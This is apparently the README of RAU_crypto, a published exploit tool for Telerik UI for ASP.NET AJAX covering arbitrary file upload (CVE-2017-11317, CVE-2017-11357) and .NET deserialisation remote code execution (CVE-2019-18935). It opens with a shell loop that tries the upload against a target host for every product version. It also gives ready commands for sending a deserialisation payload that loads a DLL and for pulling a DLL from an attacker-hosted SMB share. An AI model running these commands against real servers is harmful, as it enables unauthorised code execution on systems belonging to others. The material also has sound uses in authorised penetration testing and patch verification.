```
# https://bishopfox.com/blog/cve-2019-18935-remote-code-execution-in-telerik-ui
# https://www.telerik.com/support/whats-new/aspnet-ajax/release-history
echo 'test' > testfile.txt 
for VERSION in 2007.1423 2007.1521 2007.1626 2007.2918 2007.21010 2007.21107 2007.31218 2007.31314 2007.31425 2008.1415 2008.1515 2008.1619 2008.2723 2008.2826 2008.21001 2008.31105 2008.31125 2008.31314 2009.1311 2009.1402 2009.1527 2009.2701 2009.2826 2009.31103 2009.31208 2009.31314 2010.1309 2010.1415 2010.1519 2010.2713 2010.2826 2010.2929 2010.31109 2010.31215 2010.31317 2011.1315 2011.1413 2011.1519 2011.2712 2011.2915 2011.31115 2011.3.1305 2012.1.215 2012.1.411 2012.2.607 2012.2.724 2012.2.912 2012.3.1016 2012.3.1205 2012.3.1308 2013.1.220 2013.1.403 2013.1.417 2013.2.611 2013.2.717 2013.3.1015 2013.3.1114 2013.3.1324 2014.1.225 2014.1.403 2014.2.618 2014.2.724 2014.3.1024 2015.1.204 2015.1.225 2015.2.604 2015.2.623 2015.2.729 2015.2.826 2015.3.930 2015.3.1111 2016.1.113 2016.1.225 2016.2.504 2016.2.607 2016.3.914 2016.3.1018 2016.3.1027 2017.1.118 2017.1.228 2017.2.503 2017.2.621 2017.2.711 2017.3.913 2021.3.1111 2021.3.914 2021.2.616 2021.2.511 2021.1.330 2021.1.224 2021.1.119 2020.3.1021 2020.3.915 2020.2.617 2020.2.512 2020.1.219 2020.1.114 2019.3.1023 2019.3.917 2019.2.514 2019.1.215 2019.1.115 2018.3.910 2018.2.710 2018.2.516 2018.1.117; do     
    echo -n "$VERSION: "     
    python3 RAU_crypto.py -P 'C:\Windows\Temp' "$VERSION" testfile.txt <HOST>/Telerik.Web.UI.WebResource.axd?type=rau 2>/dev/null | grep fileInfo || echo 
done
```

# RAU_crypto
[![Language](https://img.shields.io/badge/Lang-Python-blue.svg)](https://www.python.org)

Combined exploit for Telerik UI for ASP.NET AJAX.
- File upload for CVE-2017-11317 and CVE-2017-11357 - will automatically upload the file
- .NET deserialisation for CVE-2019-18935

Now supports testing for the target's ability to pull in remote payloads from an attacker-hosted SMB service. Use Burp Collaborator and/or Responder to facilitate testing whether the necessary pre-requisites are in place.

For exploitation to work, you generally need a version with hard coded keys, or you need to know the key, for example if you can disclose the contents of web.config. The exploit also allows for straightforward decryption and encryption of the rauPostData used with Telerik.Web.UI.WebResource.axd?type=rau

## Requirements
- python >= 3.6 with pycryptodome (https://www.pycryptodome.org/en/latest/src/installation.html) - installed with `pip3 install pycryptodome` or `pip3 install pycryptodomex`

## Published on exploit-db (old version)
- https://www.exploit-db.com/exploits/43874/

## See also
My other Telerik UI exploit (for CVE-2017-9248) will probably also be of interest. It is available here:
- https://github.com/bao7uo/dp_crypto

## To do
- [x] Missing HMAC functionality for later versions.
- [x] Ability to specify custom key.
- [x] Command line argument for execution of a mixed mode dll (in the meantime use the example .NET deserialisation payload provided below).
- [x] Command line arguments for testing capability of and loading remotely (SMB) hosted mixed mode dlls 
- [ ] Separate utility for testing mixed mode dll.
- [x] Provide source code/compilation instructions for mixed mode dll.
- [ ] Brute force versions.

Note - the last four items are complete but not released.

## Vulnerabilities
The file upload (CVE-2017-11317) vulnerability was discovered by others, I believe credits due to @straight_blast @pwntester @olekmirosh . Shortly after it was announced, I encountered the Telerik library during the course of my work, so I researched it and the vulnerability and wrote this exploit in July 2017. I also reported CVE-2017-11357 for the related insecure direct object reference.

https://www.telerik.com/support/kb/aspnet-ajax/upload-%28async%29/details/insecure-direct-object-reference

The .NET deserialisation (CVE-2019-18935) vulnerability was discovered by [@mwulftange]( https://github.com/mwulftange ).

https://www.telerik.com/support/kb/aspnet-ajax/details/allows-javascriptserializer-deserialization

## Usage
```
$ ./RAU_crypto.py -h

RAU_crypto by Paul Taylor / @bao7uo 
CVE-2017-11317, CVE-2019-18935 - Telerik RadAsyncUpload hardcoded keys / arbitrary file upload / .NET deserialisation

Usage:

Decrypt a ciphertext:               -d ciphertext
Decrypt rauPostData:                -D rauPostData
Encrypt a plaintext:                -e plaintext

Generate file upload rauPostData:   -E c:\\destination\\folder Version
Generate all file upload POST data: -p c:\\destination\\folder Version ../local/filename
Upload file:                        -P c:\\destination\\folder Version c:\\local\\filename url [proxy]

Generate custom payload POST data : -c partA partB
Send custom payload:                -C partA partB url [proxy]

Check remote SMB payload capability -r lhost url [proxy]

Load remote SMB dll payload         -R lhost/share/mixed_mode_assembly.dll url [proxy]\n\n" +
Trigger local uploaded dll payload  -L c:/users/public/documents/mixed_mode_assembly.dll url [proxy]\n\n" +

Example URL:               http://target/Telerik.Web.UI.WebResource.axd?type=rau
Example Version:           2016.2.504
Example optional proxy:    127.0.0.1:8080

N.B. Advanced settings e.g. custom keys or PBKDB algorithm can be found by searching source code for: ADVANCED_SETTINGS

$
```
## Example - decryption
![Decrypt screenshot](images/decrypt_screenshot.png)

## Example - arbitrary file uplaod
![Upload screenshot](images/upload_screenshot.png)

## Custom payload (.NET deserialisation)

For details on custom payloads for .NET deserialisation, there is a great article by [@mwulftange]( https://github.com/mwulftange ) who discovered this vulnerability on the Code White blog at the following link.

- https://codewhitesec.blogspot.com/2019/02/telerik-revisited.html

Update - There is an alternative exploit by Caleb Gross [@noperator]( https://github.com/noperator/CVE-2019-18935 ), which incorporates features from this exploit, with a great blog article explaining everything. Thanks also to Caleb for contributing to RAU_Crypto.
- https://know.bishopfox.com/research/cve-2019-18935-remote-code-execution-in-telerik-ui

Other relevant links.

- https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf
- https://threatvector.cylance.com/en_us/home/implications-of-loading-net-assemblies.html
- https://thewover.github.io/Mixed-Assemblies/

Example .NET deserialisation payload:

```
$ ./RAU_crypto.py -C '{"Path":"file:///c:/users/public/documents/mixedmode64.dll"}' 'System.Configuration.Install.AssemblyInstaller, System.Configuration.Install, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a' http://target/Telerik.Web.UI.WebResource.axd?type=rau
```

For mixed Mode DLL, see my other github repo:
- https://github.com/bao7uo/MixedUp

Special thanks to [@irsdl]( https://github.com/irsdl ) who inspired the custom payload feature.

Credit to [@rwincey]( https://twitter.com/rwincey/status/1296774665239703552 ) who inspired the remote dll feature.
